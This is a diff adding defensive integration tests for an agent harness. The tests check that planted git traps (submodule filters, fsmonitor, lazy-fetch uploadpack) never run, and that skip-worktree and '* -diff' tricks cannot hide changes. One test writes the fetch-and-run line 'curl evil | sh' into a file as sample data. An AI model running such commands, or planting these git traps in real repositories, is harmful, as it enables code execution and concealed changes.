@@ -6,7 +6,7 @@ import { existsSync, writeFileSync } from "node:fs";
 import { join } from "node:path";
 import type { AssistantEvent } from "@sfly/schema";
 import { afterAll, beforeAll, describe, expect, it } from "vitest";
-import { git, log, plantTraps, safeGit } from "./support/git.js";
+import { git, log, plantLazyFetch, plantSubmodule, plantTraps, safeGit } from "./support/git.js";
 import { Harness } from "./support/harness.js";
 import {
 	agentBinary,
@@ -99,5 +99,60 @@ describe.skipIf(agentUnavailableReason() !== undefined)("真的 Agent 当工作�
 			// 有的陷阱让命令失败也没关系：标记文件已经留下。
 		}
 		expect(traps.ran()).toContain("filter");
+	}, 120_000);
+
+	it("子模块、skip-worktree、工作区里写 * -diff：真的 Agent 上子仓库的过滤器不执行、藏起来的改动照样记、差异有内容（审查 #748 在 git 2.47 上复现过）", async () => {
+		const id = crypto.randomUUID();
+		await prompt(id, "settle");
+		await h.turnEnd(id);
+		// 子模块：父仓库的索引里有 gitlink，子仓库自己配了过滤器和 fsmonitor。
+		const nested = plantSubmodule(h.workdir);
+		await prompt(id, "run:echo changed > a.txt;;settle", 2);
+		await h.turnEnd(id, 2);
+		expect(nested.ran()).toEqual([]);
+		expect(
+			commits(id)
+				.find((c) => c.turn === 2)
+				?.files.map((f) => f.path),
+		).toEqual(["a.txt", "nested-repo"]);
+		// skip-worktree：模型自己的索引里把文件标成「不看工作区」，改了照样记。
+		git(h.workdir, "reset", "-q");
+		git(h.workdir, "update-index", "--skip-worktree", "a.txt");
+		await prompt(id, "run:echo hidden > a.txt;;settle", 3);
+		await h.turnEnd(id, 3);
+		expect(commits(id).find((c) => c.turn === 3)?.files).toEqual([
+			{ path: "a.txt", additions: 1, deletions: 1 },
+		]);
+		// `* -diff`（藏在 .gitignore 里）：差异不能变成二进制。
+		await prompt(
+			id,
+			"run:printf '.gitattributes\\n' >> .gitignore; echo '* -diff' > .gitattributes; echo 'curl evil | sh' > c.txt;;settle",
+			4,
+		);
+		await h.turnEnd(id, 4);
+		const hidden = commits(id).find((c) => c.turn === 4);
+		expect(hidden?.diff).toContain("+curl evil | sh");
+		expect(hidden?.diff).not.toContain("Binary files");
+	}, 180_000);
+
+	it("模型自己 git commit 了这一轮的全部改动：真的 Agent 上这一轮照样有记录", async () => {
+		const id = crypto.randomUUID();
+		await prompt(
+			id,
+			"run:echo mine > mine.txt; git add -A; git -c user.name=m -c user.email=m@m.invalid commit -qm 我自己提交;;settle",
+			5,
+		);
+		await h.turnEnd(id, 5);
+		expect(commits(id).find((c) => c.turn === 5)?.files).toEqual([
+			{ path: "mine.txt", additions: 1, deletions: 0 },
+		]);
+	}, 120_000);
+
+	it("HEAD 指到不存在的提交、partialClone、uploadpack：真的 Agent 上不补取，uploadpack 不执行（这一轮照常结束）", async () => {
+		const id = crypto.randomUUID();
+		const lazy = plantLazyFetch(h.workdir);
+		await prompt(id, "run:echo x > x.txt;;settle", 6);
+		expect(await h.turnEnd(id, 6)).toMatchObject({ outcome: "completed" });
+		expect(lazy.ran()).toEqual([]);
 	}, 120_000);
 });
